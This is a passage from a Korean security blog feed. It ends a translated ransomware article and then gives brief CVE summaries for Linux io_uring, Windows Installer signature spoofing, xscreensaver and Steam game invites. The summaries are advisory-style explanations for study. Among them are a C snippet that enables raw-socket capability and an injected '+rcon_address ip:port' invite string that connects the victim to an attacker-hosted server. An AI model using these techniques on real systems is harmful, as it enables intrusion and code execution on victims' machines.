&#xC5C6;&#xC5B4;&#xB3C4; &#xD3EC;&#xB80C;&#xC2DD; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD30C;&#xC77C;&#xB4E4;&#xC740; &#xC0AD;&#xC81C;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xD30C;&#xC77C; &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB418;&#xC9C0; &#xC54A;&#xC744; &#xB420; &#xBFD0;&#xC774;&#xB2E4;. &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xC7AC;&#xBD80;&#xD305; &#xB41C; &#xD6C4;&#xC5D0; raw data&#xB97C; &#xC554;&#xD638;&#xD654; &#xD558;&#xB354;&#xB77C;&#xB3C4; victim&#xC774; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xB044;&#xACE0; &#xB514;&#xC2A4;&#xD06C;&#xB97C; &#xBE7C;&#xBC84;&#xB9AC;&#xBA74; &#xC77C;&#xBD80; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; &#xB2E8;&#xC810;&#xC740; &#xB300;&#xBD80;&#xBD84; <a href="https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/">&#xCD5C;&#xC2E0; OS&#xB294; GPT(GUID Partition Table)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; MBR&#xC744; &#xB354; &#xC774;&#xC0C1; &#xC4F0;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;</a>&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xC138; &#xBC88;&#xC9F8; &#xB2E8;&#xC810;&#xC740; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xC758;&#xC874;&#xC131;&#xC774; &#xB192;&#xACE0; NTFS&#xCC98;&#xB7FC; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;(EXT3/EXT4, ZFS &#xB4F1;)&#xB3C4; &#xACE0;&#xB824;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xB2E4;.</p><p>&#xC774; &#xBC29;&#xBC95;&#xC740; &#xB354; &#xB9CE;&#xC740; low-level technical concept&#xC744; &#xC694;&#xAD6C;&#xD558;&#xC5EC; &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C; &#xB9CE;&#xC774; &#xC124;&#xBA85;&#xD558;&#xACE0; &#xC2F6;&#xC9C0; &#xC54A;&#xB2E4;. &#xB610;&#xD55C; &#xC774; &#xBC29;&#xBC95;&#xB860;&#xC740; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xD544;&#xC790;&#xC758; &#xC8FC;&#xBAA9;&#xC801;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC5D0; &#xB300;&#xD574; &#xB3C5;&#xC790;&#xB4E4;&#xC774; &#xB354; &#xC798; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><h1 id="&#xACB0;&#xB860;"><a href="#&#xACB0;&#xB860;" class="headerlink" title="&#xACB0;&#xB860;"></a>&#xACB0;&#xB860;</h1><p>&#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xB4E4;(&#xCD9C;&#xCC98;&#xB97C; &#xC54C; &#xC218; &#xC5C6;&#xB294; &#xD30C;&#xC77C; &#xC5F4;&#xC9C0; &#xB9D0;&#xAE30;, &#xC778;&#xD504;&#xB77C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC720;&#xC9C0;, &#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB4F1;&#xB4F1;) &#xC678;&#xC5D0;&#xB3C4; &#xCD94;&#xCC9C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xBC31;&#xC5C5;&#xACFC; &#xBC31;&#xC5C5; &#xADF8;&#xB9AC;&#xACE0; &#xB610; &#xBC31;&#xC5C5;&#xC774;&#xB2E4;. &#xACF5;&#xACA9;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD55C; &#xB9CE;&#xC740; &#xC870;&#xC5B8;&#xC744; &#xB4E3;&#xAC8C; &#xB418;&#xACA0;&#xC9C0;&#xB9CC; &#xD544;&#xC790;&#xC758; &#xC0DD;&#xAC01;&#xC5D0;&#xB294; &#xADF8;&#xB0E5; &#xAC78;&#xB9B4; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD558;&#xACE0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC624;&#xD504;&#xB77C;&#xC778; &#xBC31;&#xC5C5;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%207.png" alt></p><p>&#xB2F9;&#xC2E0;&#xC774; &#xAC10;&#xC5FC;&#xC744; &#xD53C;&#xD55C;&#xB2E4; &#xD574;&#xB3C4; &#xB3D9;&#xB8CC; &#xC9C1;&#xC6D0;&#xC774; &#xAC78;&#xB9AC;&#xBA74; &#xB9E4;&#xD551;&#xB41C; &#xACF5;&#xC720; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC758; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC774; &#xC554;&#xD638;&#xD654; &#xB420; &#xAC83;&#xC774;&#xB2E4;.</p><blockquote><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC544;&#xBB34;&#xB3C4; &#xCD94;&#xCC9C;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xBC29;&#xBC95;: &#xAC10;&#xC5FC;&#xB41C; &#xACBD;&#xC6B0;, &#xC554;&#xD638;&#xD654;&#xB41C; &#xD30C;&#xC77C;(&#xAC00;&#xC871;&#xC0AC;&#xC9C4;, &#xBE44;&#xB514;&#xC624; &#xB4F1;)&#xC744; &#xBC14;&#xB85C; &#xBCF5;&#xAD6C;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC73C;&#xBA74; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD30C;&#xC77C;&#xC758; &#xBCF5;&#xC0AC;&#xBCF8;&#xC744; &#xBCF4;&#xAD00;&#xD574;&#xB77C;. &#xBA40;&#xC6E8;&#xC5B4; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xC740;&#xD1F4;(Shade, TeslaCrypt, HildaCrypt)&#xD558;&#xAC70;&#xB098; &#xCCB4;&#xD3EC;(CoinVault)&#xB418;&#xAC70;&#xB098; &#xACBD;&#xC7C1;&#xC790;&#xC758; &#xD0A4;&#xB97C; &#xBC30;&#xD3EC;(Petya vs Chimera)&#xD558;&#xB294; &#xB4F1; &#xD574;&#xB3C5; &#xD0A4;&#xAC00; &#xACF5;&#xAC1C;&#xB420; &#xC218; &#xC788;&#xB2E4;. &#xC6B4; &#xC88B;&#xC73C;&#xBA74; &#xBA87; &#xB2EC; &#xC548;&#xC5D0; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>ransomware</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-20226: Linux kernel Reference counting bug</title>
    <link href="/2021/04/24/fabu1ous/2021-04-24/"/>
    <url>/2021/04/24/fabu1ous/2021-04-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/4/22/cve-2021-20226-a-reference-counting-bug-in-the-linux-kernel-iouring-subsystem">CVE-2021-20226</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 5.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Linux kernel 5.1&#xC5D0;&#xC11C; &#xD558;&#xB098;&#xC758; &#xC2DC;&#xC2A4;&#xD15C;&#xCF5C;&#xB85C; &#xC5EC;&#xB7EC; I/O&#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; io_uring(&#xBE44;&#xB3D9;&#xAE30; I/O) &#xAE30;&#xB2A5;&#xC774; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Linux kernel 5.6&#xC73C;&#xB85C; &#xC62C;&#xB77C;&#xC624;&#xBA74;&#xC11C; &#xD574;&#xB2F9; &#xAE30;&#xB2A5;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC0DD;&#xACBC;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2DC;&#xC2A4;&#xD15C; &#xCF5C;&#xC774; &#xCEE4;&#xB110; &#xC4F0;&#xB808;&#xB4DC;&#xB85C; <code>files_structure</code>&#xB97C; &#xC804;&#xB2EC;&#xD574;&#xB3C4; <code>io_grab_files()</code>&#xC758; reference counter&#xAC00; &#xC99D;&#xAC00;&#xD558;&#xC9C0; &#xC54A;&#xC544; <code>IORING_OP_CLOSE</code>&#xC791;&#xC5C5;&#xC774; &#xC9C4;&#xD589;&#xB418;&#xB294; &#xB3D9;&#xC548; <code>files_structure</code>&#xC758; &#xC874;&#xC7AC; &#xC720;&#xBB34;&#xB97C; &#xD310;&#xB2E8;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC989;, &#xD574;&#xB2F9; <code>files_structure</code>&#xAC00; &#xD560;&#xB2F9; &#xD574;&#xCCB4;&#xB41C; &#xC774;&#xD6C4;&#xC5D0;&#xB3C4; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xACE0; DoS&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">io_grab_files</span><span class="hljs-params">(struct io_kiocb *req)</span> </span><span class="hljs-function"></span>{ <span class="hljs-comment">// ... </span>     rcu_read_lock();     spin_lock_irq(&amp;ctx-&gt;inflight_lock);spin_lock_irq(&amp;ctx-&gt;inflight_lock);      <span class="hljs-keyword">if</span> (fcheck(ctx-&gt;ring_fd) == ctx-&gt;ring_file) {         list_add(&amp;req-&gt;inflight_entry, &amp;ctx-&gt;inflight_list);         req-&gt;flags |= REQ_F_INFLIGHT;         req-&gt;work.files = current-&gt;files;  <span class="hljs-comment">// vuln here</span>        ret = <span class="hljs-number">0</span>;     }     spin_unlock_irq(&amp;ctx-&gt;inflight_lock);     rcu_read_unlock();      <span class="hljs-keyword">return</span> ret; }</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>Fabu1ous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26413: Windows Installer Signature Spoofing 취약점</title>
    <link href="/2021/04/23/insu/2021-04-23/"/>
    <url>/2021/04/23/insu/2021-04-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sec.okta.com/articles/2021/04/uncovering-and-disclosing-signature-spoofing-vulnerability-windows">Uncovering and Disclosing a Signature Spoofing Vulnerability in Windows Installer: CVE-2021-26413</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Installer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Installer (MSI) Authenticode &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xD574;&#xCEE4;&#xC5D0; &#xC758;&#xD574; &#xC870;&#xC791;&#xB41C; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xD569;&#xBC95;&#xC801;&#xC778; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB85C; &#xC704;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Windows Installer &#xD30C;&#xC77C;&#xC758; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xAE30; &#xC704;&#xD574; OS&#xB098; &#xC0AC;&#xC6A9;&#xC790;&#xB294; <code>WinVerifyTrust</code> &#xB610;&#xB294; <code>WinVerifyTrustEx</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xD30C;&#xC77C;&#xC758; type&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; Subject Interface Package(SIP, MSI&#xC758; &#xACBD;&#xC6B0; <code>MSISIP.dll</code>)&#xB97C; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; <code>MsiSIPGetSignedDataMsg</code>&#xC640; <code>MsiSIPVerifyIndirectData</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xC5D0;&#xC11C; Signature Data&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xACE0; &#xD655;&#xC778;&#xD558;&#xB294; DLL exports&#xC758; &#xC774;&#xB984;&#xB4E4;&#xC744; &#xCFFC;&#xB9AC; &#xD569;&#xB2C8;&#xB2E4;.</p><p>MSI &#xD30C;&#xC77C;&#xC740; Compound File Binary format&#xC744; &#xB530;&#xB985;&#xB2C8;&#xB2E4;. &#xC774; &#xD615;&#xC2DD;&#xC758; &#xD30C;&#xC77C;&#xB4E4;&#xC740; &#xC774; format&#xC758; &#xD30C;&#xC77C;&#xB4E4;&#xC740; Storage object&#xAC00; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xACE0; Steam obejct&#xAC00; &#xD30C;&#xC77C; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC785;&#xB2C8;&#xB2E4;. <code>MsiSIPGetSignedDataMsg</code> &#xD568;&#xC218;&#xB294; <code>\\x05DigitalSignature</code> stream&#xC5D0;&#xC11C; signature data&#xB97C; &#xC5BB;&#xACE0; <code>MsiSIPVerifyIndirectData</code> &#xD568;&#xC218;&#xB294; root directory storage object&#xBD80;&#xD130; &#xACC4;&#xC0B0;&#xD558;&#xACE0; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</p><p>exploit&#xC740; <code>MSISIP.dll</code>&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB418;&#xC9C0; &#xC54A;&#xC740; byte&#xB4E4;&#xC744; &#xACE0;&#xB824;&#xD558;&#xB294;&#xB370; &#xC2E4;&#xD328;&#xD574;&#xC11C; &#xC77C;&#xC5B4;&#xB0A9;&#xB2C8;&#xB2E4;.</p><blockquote><p>Usually, a compound file includes ranges of bytes that are not allocated for either CFB structures or user-defined data. For instance, each stream whose length is not an exact multiple of the sector size requires a trailing portion of the last sector in the stream&#x2019;s sector chain to be unused. Implementations that fail to initialize these byte ranges to zero (as recommended in section 2.7) might unintentionally leak user data.</p></blockquote><p>&#xC774; &#xD560;&#xB2F9;&#xB418;&#xC9C0; &#xC54A;&#xC740; byte&#xB4E4;&#xC740; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xACE0; &#xACC4;&#xC0B0;&#xD558;&#xB294;&#xB370; &#xACE0;&#xB824;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC545;&#xC758;&#xC801;&#xC778; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31523: linux 화면보호기 xscreensaver의 소켓 정보유출 취약점</title>
    <link href="/2021/04/23/l0ch/2021-04-23/"/>
    <url>/2021/04/23/l0ch/2021-04-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2174">Issue 2174: xscreensaver: raw socket leaked</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Debian xscreensaver 5.42 + dfsg1-1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>linux&#xC6A9; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD654;&#xBA74; &#xBCF4;&#xD638;&#xAE30;&#xC778; xscreensaver&#xC758; debian &#xBC30;&#xD3EC;&#xD310;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xC18C;&#xCF13; &#xC815;&#xBCF4;&#xC720;&#xCD9C; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>xscreensaver&#xC758; &#xB2E4;&#xC74C; &#xACBD;&#xB85C;&#xC5D0; &#xC77C;&#xBC18; &#xACC4;&#xC815;&#xC758; &#xD328;&#xD0B7; &#xCEA1;&#xCC98;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xB294; <code>cap_net_raw=p</code> &#xAD8C;&#xD55C;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">$ getcap /usr/libexec/xscreensaver/sonar/usr/libexec/xscreensaver/sonar cap_net_raw=p</code></pre><p>&#xD574;&#xCEE4;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xAD8C;&#xD55C;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC6D0;&#xC2DC; &#xC18C;&#xCF13;&#xC744; &#xC5BB;&#xACE0; &#xC815;&#xBCF4;&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xAC70;&#xB098; tcpdump &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// Enable CAP_NET_RAW</span>caps = cap_get_proc();cap_set_flag(caps, CAP_EFFECTIVE, <span class="hljs-number">1</span>, caplist, CAP_SET);cap_set_proc(caps);cap_free(caps);<span class="hljs-comment">// Now we can get a raw socket.</span>sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);</code></pre><p>&#xC774;&#xB97C; <code>MESA_LOADER_DRIVER_OVERRIDE</code> &#xD658;&#xACBD;&#xBCC0;&#xC218; &#xC124;&#xC815;&#xC744; &#xD1B5;&#xD574; xscreensaver&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xBA74; root&#xAC00; &#xC544;&#xB2CC; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC5D0;&#xC11C; &#xC18C;&#xCF13; &#xC815;&#xBCF4;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>information disclosure</tag>
      
      <tag>linux</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30481: Steam 게임 초대를 통한 원격 코드 실행 취약점</title>
    <link href="/2021/04/22/idioth/2021-04-22/"/>
    <url>/2021/04/22/idioth/2021-04-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://secret.club/2021/04/20/source-engine-rce-invite.html">CVE-2021-30481: Source engine remote code execution via game invites</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Valve Steam through 2021-04-10</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Valve&#xC758; PC &#xAC8C;&#xC784; &#xB7F0;&#xCC98; Steam&#xC5D0;&#xC11C; <a href="https://partner.steamgames.com/doc/sdk/api">Steamworks API</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Steamworks API&#xB294; &#xAC8C;&#xC784; &#xAC1C;&#xBC1C;&#xC790;&#xB4E4;&#xC774; interface set&#xC744; &#xD1B5;&#xD574; &#xAC8C;&#xC784; &#xB0B4;&#xC5D0;&#xC11C; &#xB2E4;&#xC591;&#xD55C; Steam &#xAE30;&#xB2A5;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; API&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xB294; <code>InviteUserToGame</code> &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">InviteUserToGame</span><span class="hljs-params">(CSteamID steamIDFriend, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pchConnectString)</span></span>;</code></pre><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xCE5C;&#xAD6C;&#xAC00; &#xAC8C;&#xC784;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; &#xAC8C;&#xC784; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xCE5C;&#xAD6C;&#xB97C; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB85C; &#xC9C0;&#xC815;&#xD558;&#xC5EC; Command line &#xB05D;&#xC5D0; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;. &#xAC8C;&#xC784; &#xB0B4; &#xCF58;&#xC194;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xAC8C;&#xC784; &#xB0B4; &#xCF58;&#xC194;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xC774; &#xB418;&#xC9C0;&#xB9CC; Source Engine &#xAC8C;&#xC784;&#xC758; &#xACBD;&#xC6B0; &#xCF58;&#xC194; command&#xB97C; &#xC9C0;&#xC815;&#xD560; &#xB54C; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC6D0;&#xD558;&#xB294; &#xAC8C;&#xC784; &#xBA85;&#xB839;&#xC744; &#xC784;&#xC758;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9CE;&#xC740; source engine &#xAC8C;&#xC784;&#xC5D0;&#xB294; <a href="https://developer.valvesoftware.com/wiki/Source_RCON_Protocol">Source RCON Protocol</a>&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC11C;&#xBC84; &#xC18C;&#xC720;&#xC790;&#xAC00; &#xAC8C;&#xC784; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAC8C;&#xC784; &#xC11C;&#xBC84; context&#xC5D0;&#xC11C; &#xCF58;&#xC194; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC8C;&#xC784; &#xC11C;&#xBC84;&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; <code>rcon_address</code>&#xC640; <code>rcon_password</code> &#xBA85;&#xB839;&#xC744; &#xD1B5;&#xD574; &#xC5F0;&#xACB0;&#xC744; &#xC778;&#xC99D;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xAC00; <code>InviteUserToGame</code>&#xC758; &#xB450; &#xBC88;&#xC9F8; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; <code>+rcon_address ip:port +rcon&quot;</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xC5EC; &#xCD08;&#xB300;&#xB97C; &#xBCF4;&#xB0B4;&#xBA74; &#xD574;&#xB2F9; &#xCD08;&#xB300;&#xB97C; &#xC218;&#xB77D;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xC5B4;&#xB5A0;&#xD55C; &#xC54C;&#xB9BC;&#xB3C4; &#xC5C6;&#xC774; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB85C; &#xC5F0;&#xACB0;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC545;&#xC758;&#xC801;&#xC778; RCON &#xC11C;&#xBC84;&#xB97C; &#xD638;&#xC2A4;&#xD305; &#xD558;&#xB294; &#xD574;&#xCEE4;&#xB294; <code>SERVERDATA_SCREENSHOT_RESPONSE</code> &#xD328;&#xD0B7;&#xC744; &#xD1B5;&#xD574; RCON &#xC11C;&#xBC84;&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC784;&#xC758;&#xC758; ZIP archive &#xD30C;&#xC77C;(<code>screenshot.jpg</code>)&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xCE74;&#xC774;&#xBE0C; &#xB0B4;&#xC758; <code>screanshot.jpg</code> &#xD30C;&#xC77C; &#xC815;&#xBCF4;&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xB294; <code>CRConClient::SaveRemoteScreenshot</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74; <code>FindZipItem</code>&#xC774; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. <code>FindZipItem</code>&#xC5D0;&#xC11C; <code>lufseek</code>&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xB0B4;&#xBD80; &#xD30C;&#xC77C; &#xD3EC;&#xC778;&#xD130;&#xC778; <code>s-&gt;cur_file_info_internal.offset_curfile</code> &#xBD80;&#xBD84;&#xC744; &#xC218;&#xC815;&#xD558;&#xC5EC; &#xC2A4;&#xD0DD;&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. 